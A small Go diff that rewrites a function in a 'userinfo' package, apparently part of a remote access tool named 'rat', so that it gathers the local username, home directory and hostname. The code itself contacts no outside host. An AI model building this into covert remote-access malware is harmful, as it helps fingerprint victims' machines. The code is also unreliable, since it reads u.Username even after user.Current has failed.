@@ -2,14 +2,32 @@
 
 package userinfo
 
-import "os/user"
+import (
+	"fmt"
+	"os"
+	"os/user"
+	"rat/common"
+)
 
 func GetComputerInformation() common.Computer {
-	u := user.Current()
+	u, err := user.Current()
 
-	return common.Computer{
-		Username: u.Username,
-		Hostname: "",
-		HomeDir: u.HomeDir
+	if err != nil {
+		fmt.Println(err.Error())
 	}
+
+	info := common.Computer{}
+
+	info.Username = u.Username
+	info.HomeDir = u.HomeDir
+
+	hostname, err := os.Hostname()
+
+	if err != nil {
+		fmt.Println(err.Error())
+	}
+
+	info.Hostname = hostname
+
+	return info
 }
